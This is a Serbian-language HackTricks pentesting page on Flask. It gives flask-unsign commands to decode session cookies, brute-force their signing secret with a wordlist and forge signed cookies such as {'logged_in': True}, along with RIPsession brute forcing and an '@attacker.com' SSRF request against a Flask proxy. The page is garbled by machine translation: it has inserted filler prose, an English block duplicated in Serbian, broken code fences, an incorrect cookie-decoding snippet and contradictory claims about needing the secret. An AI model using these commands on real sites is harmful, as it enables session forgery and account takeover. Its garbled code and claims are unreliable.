# Flask

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomo캖 najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**Verovatno ako igrate CTF, Flask aplikacija 캖e biti povezana sa** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**.**

## Kola캜i캖i

Podrazumevano ime sesije kola캜i캖a je **`session`**.

### Dekoder

Online Flask dekoder kola캜i캖a: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Ru캜no

Dobijte prvi deo kola캜i캖a do prvog ta캜kog znaka i dekodirajte ga iz Base64 formata>
```bash
echo "ImhlbGxvIg" | base64 -d
```
Kola캜i캖 je tako캠e potpisan kori코캖enjem lozinke

### **Flask-Unsign**

Komandna linija alatka za preuzimanje, dekodiranje, brute-force napad i kreiranje sesijskih kola캜i캖a Flask aplikacije poga캠anjem tajnih klju캜eva.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Dekodiranje kola캜i캖a**

```plaintext
To decode a Flask session cookie, you can use the `itsdangerous` library. The session cookie is usually named `session` and is base64 encoded. Here's an example of how to decode it:

```python
import base64
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    decoded_cookie = base64.b64decode(cookie_value)
    data = serializer.loads(decoded_cookie)
    return data
```

In the above code, `cookie_value` is the value of the session cookie and `secret_key` is the secret key used to sign the cookie. The `URLSafeTimedSerializer` class from `itsdangerous` library is used to deserialize the cookie value.

To use the `decode_cookie` function, you can pass the session cookie value and the secret key as arguments. It will return the decoded data from the cookie.

Keep in mind that decoding a session cookie requires the secret key used to sign the cookie. Without the secret key, it is not possible to decode the cookie and access its data.
```

```plaintext
Da biste dekodirali Flask sesijski kola캜i캖, mo쬰te koristiti biblioteku `itsdangerous`. Sesijski kola캜i캖 obi캜no se naziva `session` i kodiran je u base64 formatu. Evo primera kako ga dekodirati:

```python
import base64
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    decoded_cookie = base64.b64decode(cookie_value)
    data = serializer.loads(decoded_cookie)
    return data
```

U gornjem kodu, `cookie_value` je vrednost sesijskog kola캜i캖a, a `secret_key` je tajni klju캜 koji se koristi za potpisivanje kola캜i캖a. Klasa `URLSafeTimedSerializer` iz biblioteke `itsdangerous` koristi se za deserijalizaciju vrednosti kola캜i캖a.

Da biste koristili funkciju `decode_cookie`, mo쬰te proslediti vrednost sesijskog kola캜i캖a i tajni klju캜 kao argumente. Vrati캖e dekodirane podatke iz kola캜i캖a.

Imajte na umu da za dekodiranje sesijskog kola캜i캖a potreban je tajni klju캜 koji se koristi za potpisivanje kola캜i캖a. Bez tajnog klju캜a nije mogu캖e dekodirati kola캜i캖 i pristupiti njegovim podacima.
```
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Brute Force**

#### **Bruteforsiranje**

Brute force je tehnika koja se koristi za poku코aj otkrivanja lozinke ili klju캜a tako 코to se sistem napada iscrpnom proverom svih mogu캖ih kombinacija. Ova tehnika se 캜esto koristi u napadima na veb aplikacije kako bi se probila autentifikacija ili pristupilo za코ti캖enim resursima. 

Da bi se izvr코io brute force napad, napada캜 koristi automatizovani alat koji generi코e i proverava veliki broj kombinacija lozinki ili klju캜eva. Ovaj proces mo쬰 biti vremenski zahtevan, ali mo쬰 biti uspe코an ako je lozinka ili klju캜 slabo postavljen. 

Da bi se za코titili od brute force napada, preporu캜uje se kori코캖enje sna쬹ih lozinki ili klju캜eva koji se sastoje od kombinacije slova, brojeva i specijalnih znakova. Tako캠e, implementacija mehanizama za detekciju i spre캜avanje brute force napada mo쬰 biti od velike pomo캖i.
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **Potpisivanje**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### Potpisivanje pomo캖u zastarelih (starih verzija)

U nekim starijim verzijama Flask-a, postoji mogu캖nost potpisivanja podataka pomo캖u `itsdangerous` biblioteke. Ova biblioteka omogu캖ava generisanje digitalnog potpisa koji se mo쬰 koristiti za verifikaciju integriteta podataka.

Da biste koristili ovu funkcionalnost, prvo morate instalirati `itsdangerous` biblioteku. To mo쬰te uraditi pomo캖u pip komande:

```plaintext
pip install itsdangerous
```

Nakon instalacije, mo쬰te koristiti `itsdangerous` biblioteku za generisanje potpisa. Evo jednostavnog primera:

```python
from itsdangerous import Signer

# Kreiranje potpisiva캜a
signer = Signer('tajni_kljuc')

# Potpisivanje podataka
potpisani_podaci = signer.sign('Podaci koje 쬰lite da potpi코ete')

# Verifikacija potpisa
try:
    verifikovani_podaci = signer.unsign(potpisani_podaci)
    print('Potpis je validan.')
    print('Verifikovani podaci:', verifikovani_podaci)
except:
    print('Potpis nije validan.')
```

U ovom primeru, `tajni_kljuc` predstavlja tajni klju캜 koji se koristi za generisanje potpisa. Mo쬰te koristiti bilo koji tajni klju캜 koji 쬰lite.

Napomena: Ova metoda potpisivanja se smatra zastarelom i preporu캜uje se kori코캖enje novijih metoda potpisivanja koje pru쬬 Flask.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

Komandna linija alatka za brute-force napade na veb sajtove koriste캖i kola캜i캖e kreirane pomo캖u flask-unsign biblioteke.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi u Flask sesijskom kola캜i캖u pomo캖u SQLmap-a

[**Ovaj primer**](../../pentesting-web/sql-injection/sqlmap/#eval) koristi sqlmap `eval` opciju da **automatski potpi코e sqlmap payload-e** za Flask koriste캖i poznati tajni klju캜.

## Flask Proxy za SSRF

[**U ovom 캜lanku**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) je obja코njeno kako Flask dozvoljava zahtev koji po캜inje sa karakterom "@":
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
Koji je slede캖i scenario:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
Mogu캖e je omogu캖iti uno코enje ne캜ega poput "@attacker.com" kako bi se izazvao **SSRF**.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomo캖 najnaprednijih alata zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **ogla코avanje va코e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
